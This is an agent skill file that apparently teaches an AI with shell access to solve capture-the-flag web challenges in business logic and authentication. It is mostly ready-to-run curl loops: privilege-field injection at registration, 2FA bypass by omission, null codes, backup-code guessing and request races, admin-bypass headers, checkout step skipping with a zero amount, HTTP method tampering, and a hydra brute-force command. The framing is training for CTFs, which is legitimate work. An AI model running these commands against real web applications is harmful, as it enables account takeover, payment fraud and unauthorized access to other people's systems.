---
name: business-logic
description: "Business logic / authentication bypass / privilege escalation — POST body field tampering (role/is_admin/user_type), 2FA bypass via response manipulation, predictable TOTP seeds, hidden authorization headers, multi-step workflow tampering. For challenges tagged business_logic, privilege_escalation, 2fa_bypass, or auth_bypass that aren't pure IDOR/JWT."
allowed-tools: Bash Read Write
metadata:
  subdomain: execution
  when_to_use: "business logic, privilege escalation, 2fa bypass, auth bypass, role manipulation, is_admin, user_type, hidden field, totp, predictable code, response tampering, X-Forwarded-User, multi-step workflow"
  tags: web-application, business-logic, privilege-escalation, auth-bypass, 2fa-bypass
  mitre_attack: T1190, T1078
---

# Business Logic / Privilege Escalation

For challenges where the vulnerability is in the application's business rules, not in standard injection sinks. Common patterns: client-controlled privilege fields, 2FA bypass, predictable codes, hidden auth headers.

## 1. POST-Body Privilege Field Tampering

When registration/profile endpoints accept arbitrary JSON or form fields, the server may read trusted privilege flags from the request:

```bash
# Intercept normal registration first to see what fields are sent
curl -s -X POST 'https://<TARGET>/register' \
  -H 'Content-Type: application/json' \
  -d '{"username":"alice","email":"a@a.com","password":"x"}' -v 2>&1 > /tmp/register_baseline.txt
head -50 /tmp/register_baseline.txt

# Add common privilege fields to the body
for field in 'role:admin' 'is_admin:true' 'admin:1' 'user_type:admin' 'isAdmin:true' 'is_superuser:true' 'staff:true' 'level:99' 'group:administrators'; do
    key=${field%:*}; val=${field#*:}
    echo "=== try $key=$val ==="
    curl -s -X POST 'https://<TARGET>/register' \
      -H 'Content-Type: application/json' \
      -d "{\"username\":\"u_$RANDOM\",\"password\":\"x\",\"$key\":$val}" \
      -o /tmp/priv_probe.txt -w '%{http_code}\n'
    grep -i 'admin\|role\|privilege\|flag\|token' /tmp/priv_probe.txt | head -5
done
```

## 2. 2FA Bypass Patterns

```bash
# (a) Bypass-by-omission — skip /2fa/verify entirely, go directly to /dashboard with partially-authenticated session
curl -s 'https://<TARGET>/dashboard' -b 'session=<post-login-pre-2fa>' -o /tmp/bypass_omit.txt -w '%{http_code}\n'

# (b) Empty / null code
curl -s -X POST 'https://<TARGET>/2fa/verify' -d 'code=' -b 'session=...' -o /tmp/r.txt -w '%{http_code}\n'
curl -s -X POST 'https://<TARGET>/2fa/verify' -H 'Content-Type: application/json' \
  -d '{"code":null}' -b 'session=...' -o /tmp/r.txt -w '%{http_code}\n'
curl -s -X POST 'https://<TARGET>/2fa/verify' -H 'Content-Type: application/json' \
  -d '{}' -b 'session=...' -o /tmp/r.txt -w '%{http_code}\n'

# (c) Backup code enumeration (often 8-digit numeric)
for code in 00000000 11111111 12345678 87654321; do
    curl -s -X POST 'https://<TARGET>/2fa/verify' -d "code=$code" -b 'session=...' -o /tmp/r.txt -w "%{http_code} $code\n"
done

# (d) TOTP seed leak — check registration response for "secret" or "qr" field; if leaked, generate code
# python3 -c "import pyotp; print(pyotp.TOTP('<LEAKED_SECRET>').now())"

# (e) Race condition on verify — submit concurrently to beat rate-limit or state check
seq 1 20 | xargs -P 20 -I _ curl -s -X POST 'https://<TARGET>/2fa/verify' \
  -d 'code=999999' -b 'session=...' -o /dev/null -w '%{http_code}\n' | sort | uniq -c
```

## 3. Hidden Authorization Headers

```bash
# Try common admin-bypass headers — redirect output to avoid inlining
for h in 'X-Admin: true' 'X-User-Role: admin' 'X-Forwarded-User: admin' \
          'X-Forwarded-For: 127.0.0.1' 'X-Real-IP: 127.0.0.1' \
          'X-Original-URL: /admin' 'X-Rewrite-URL: /admin' \
          'X-Custom-IP-Authorization: 127.0.0.1' 'Referer: https://<TARGET>/admin'; do
    echo "=== $h ==="
    curl -s -H "$h" 'https://<TARGET>/admin' -o /tmp/header_probe.txt -w '%{http_code}\n'
    grep -i 'admin\|flag\|dashboard\|forbidden' /tmp/header_probe.txt | head -3
done
```

## 4. Multi-Step Workflow Tampering

When a workflow has steps (e.g., cart → checkout → payment → confirm), tampering with the step transition can skip payment or unlock states:

```bash
# Skip a step: directly POST to a later step's endpoint with state from earlier step
curl -s -X POST 'https://<TARGET>/checkout/confirm' \
  -d 'order_id=<id_from_step_1>' -b 'session=...' -o /tmp/skip_step.txt -w '%{http_code}\n'

# Replay a step with modified state
curl -s -X POST 'https://<TARGET>/checkout/payment' \
  -d 'amount=0&order_id=<id>' -b 'session=...' -o /tmp/mod_state.txt -w '%{http_code}\n'
```

## 5. Credential Brute-Force (when explicitly correct strategy)

If the challenge clearly intends credential discovery (explicit hint about default creds), use `hydra` instead of curl loops:

```bash
hydra -L /usr/share/wordlists/seclists/usernames/top-usernames-shortlist.txt \
      -P /usr/share/wordlists/rockyou.txt \
      -t 16 -f -V \
      <TARGET> http-post-form '/login:user=^USER^&pass=^PASS^:Invalid' \
      -o /tmp/hydra_out.txt
```

**Do NOT default to brute-force.** Try Sections 1-4 first — most CTF challenges tagged `privilege_escalation` are NOT brute-forceable; they require business-logic exploitation.

## 6. HTTP Method Tampering

When a privileged endpoint returns 403/401 on GET/POST, the authorization check may only validate certain methods:

```bash
# Test all methods against the restricted endpoint
for method in GET POST PUT PATCH DELETE OPTIONS HEAD; do
  curl -s -X "$method" "http://<TARGET>/admin" \
    -H "Cookie: session=$SESSION" -o /tmp/method_${method}.txt \
    -w "$method: %{http_code}\n"
done

# Override headers — some proxies/frameworks honor these
for override in "X-HTTP-Method-Override: PUT" "X-Method-Override: DELETE" "X-HTTP-Method: PATCH"; do
  curl -s -X POST "http://<TARGET>/admin" \
    -H "$override" -H "Cookie: session=$SESSION" \
    -o /tmp/override_probe.txt -w "Override $override: %{http_code}\n"
  grep -i "flag\|admin\|dashboard" /tmp/override_probe.txt | head -3
done
```

Pattern: `GET /admin → 403`, `PUT /admin → 200` means auth only validates read methods. Try all methods before concluding an endpoint is inaccessible.

**When to use**: Challenge tagged `http_method_tamper` or `privilege_escalation` when Sections 1-4 yield no result and a `/admin` or restricted path was found during recon.

## Decision Tree

```
Challenge tagged business_logic / privilege_escalation / 2fa_bypass?
├── Has registration endpoint → Try POST-body privilege fields (Section 1) first
├── Has 2FA → Try 2FA bypass in order: omission, empty/null, backup codes, TOTP leak, race (Section 2)
├── Has /admin or restricted endpoint → Try header injection (Section 3)
├── Has multi-step workflow → Try state tampering (Section 4)
├── Hint explicitly says brute-force or default-creds → Use hydra not manual curl loop (Section 5)
└── None apply → Re-read challenge description; hint may be in HTML comments or JS
```

**Anti-pattern (real-world evidence)**: agent ran 30 manual password guesses on /login, never tried POST-body privilege fields, 2FA bypass, or header injection. Cost: 35s of manual brute + 845s dead zone + 200s late discovery + timeout. Section 1 alone (10 candidate field tampering attempts) would have taken <30s and likely solved this challenge.
